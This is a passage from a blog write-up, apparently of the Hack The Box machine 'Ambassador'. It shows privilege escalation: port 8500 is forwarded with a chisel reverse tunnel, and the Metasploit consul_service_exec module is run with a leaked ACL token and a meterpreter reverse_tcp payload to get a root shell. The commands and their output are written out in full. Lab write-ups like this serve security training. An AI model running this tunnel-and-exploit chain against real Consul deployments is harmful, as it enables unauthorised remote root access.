</span></span></code></pre></div><p>As they are addressing in here, they are using something called <a href="https://www.consul.io/">Consul</a> and as you can see they have removed a <strong>token</strong> from their code. Then I tried to google a little bit about this <strong>Consul</strong> and I found that the Consul is a free and open-source service networking platform developed by HashiCorp which is written in <a href="https://go.dev/">Go</a>. After a little while I found a exploit for <a href="https://www.rapid7.com/db/modules/exploit/multi/misc/consul_service_exec/">Remote Command Execution via Services API</a>.</p>
<p>We have to forward the <code>8500</code> port fromt he box to our local machine. For that I&rsquo;m goind to use <a href="https://github.com/jpillora/chisel">chisel</a>. The reason we forwarding only the port <code>8500</code> is that the Consul service is running on that port. We can find it as follows.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>developer@ambassador:~$ netstat -tupln
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>Not all processes could be identified, non-owned process info
</span></span><span style="display:flex;"><span> will not be shown, you would have to be root to see it all.<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Active Internet connections <span style="color:#f92672">(</span>only servers<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 127.0.0.1:8301          0.0.0.0:*               LISTEN      -
</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 127.0.0.1:8302          0.0.0.0:*               LISTEN      -
</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 127.0.0.1:8500          0.0.0.0:*               LISTEN      -
</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 127.0.0.53:53           0.0.0.0:*               LISTEN      -
</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 0.0.0.0:22              0.0.0.0:*               LISTEN      -
</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 127.0.0.1:8600          0.0.0.0:*               LISTEN      -
</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 127.0.0.1:33060         0.0.0.0:*               LISTEN      -
</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 0.0.0.0:3306            0.0.0.0:*               LISTEN      -
</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 127.0.0.1:8300          0.0.0.0:*               LISTEN      -
</span></span><span style="display:flex;"><span>tcp6       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> :::80                   :::*                    LISTEN      -
</span></span><span style="display:flex;"><span>tcp6       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> :::22                   :::*                    LISTEN      -
</span></span><span style="display:flex;"><span>tcp6       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> :::3000                 :::*                    LISTEN      -
</span></span><span style="display:flex;"><span>udp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 127.0.0.1:8600          0.0.0.0:*                           -
</span></span><span style="display:flex;"><span>udp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 127.0.0.53:53           0.0.0.0:*                           -
</span></span><span style="display:flex;"><span>udp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 0.0.0.0:68              0.0.0.0:*                           -
</span></span><span style="display:flex;"><span>udp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 127.0.0.1:8301          0.0.0.0:*                           -
</span></span><span style="display:flex;"><span>udp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 127.0.0.1:8302          0.0.0.0:*                           -
</span></span></code></pre></div><p>Then make a <code>chisel</code> server on your local machine.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&gt; ./chisel server --reverse --port <span style="color:#ae81ff">8832</span>
</span></span></code></pre></div><p>And then make a <code>chisel</code> client on the box like this.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&gt; /chisel client -v 10.10.14.16:8832 R:8500:127.0.0.1:8500
</span></span></code></pre></div><p>Then fire up the <a href="https://www.metasploit.com/">Metasploit Framework</a> and exploit this to get a root shell.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 &gt; use exploit/multi/misc/consul_service_exec
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Using configured payload linux/x86/meterpreter/reverse_tcp
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/misc/consul_service_exec<span style="color:#f92672">)</span> &gt; set payload linux/x86/meterpreter/reverse_tcp
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span>&gt; linux/x86/meterpreter/reverse_tcp
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/misc/consul_service_exec<span style="color:#f92672">)</span> &gt; set rhosts 127.0.0.1
</span></span><span style="display:flex;"><span>rhosts <span style="color:#f92672">=</span>&gt; 127.0.0.1
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/misc/consul_service_exec<span style="color:#f92672">)</span> &gt; set lhost 10.10.14.16
</span></span><span style="display:flex;"><span>lhost <span style="color:#f92672">=</span>&gt; 10.10.14.16
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/misc/consul_service_exec<span style="color:#f92672">)</span> &gt; set acl_token bb03b43b-1d81-d62b-24b5-39540ee469b5
</span></span><span style="display:flex;"><span>acl_token <span style="color:#f92672">=</span>&gt; bb03b43b-1d81-d62b-24b5-39540ee469b5
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/misc/consul_service_exec<span style="color:#f92672">)</span> &gt; exploit
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP handler on 10.10.14.16:4444
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Creating service <span style="color:#e6db74">&#39;dhEKmeKYz&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Service <span style="color:#e6db74">&#39;dhEKmeKYz&#39;</span> successfully created.
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Waiting <span style="color:#66d9ef">for</span> service <span style="color:#e6db74">&#39;dhEKmeKYz&#39;</span> script to trigger
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sending stage <span style="color:#f92672">(</span><span style="color:#ae81ff">1017704</span> bytes<span style="color:#f92672">)</span> to 10.10.11.183
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Meterpreter session <span style="color:#ae81ff">1</span> opened <span style="color:#f92672">(</span>10.10.14.16:4444 -&gt; 10.10.11.183:49088<span style="color:#f92672">)</span> at 2023-01-16 19:52:31 +0530
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Removing service <span style="color:#e6db74">&#39;dhEKmeKYz&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Command Stager progress - 100.00% <span style="color:#66d9ef">done</span> <span style="color:#f92672">(</span>763/763 bytes<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>meterpreter &gt; shell
</span></span><span style="display:flex;"><span>Process <span style="color:#ae81ff">27935</span> created.
</span></span><span style="display:flex;"><span>Channel <span style="color:#ae81ff">1</span> created.
</span></span><span style="display:flex;"><span>whoami
</span></span><span style="display:flex;"><span>root
</span></span><span style="display:flex;"><span>cat /root/root.txt
</span></span><span style="display:flex;"><span>0d9**************************263
</span></span></code></pre></div>
    </div>
    <div class="post-footer">
      
    </div>
  </article>

    </main>
  </body>
</html>
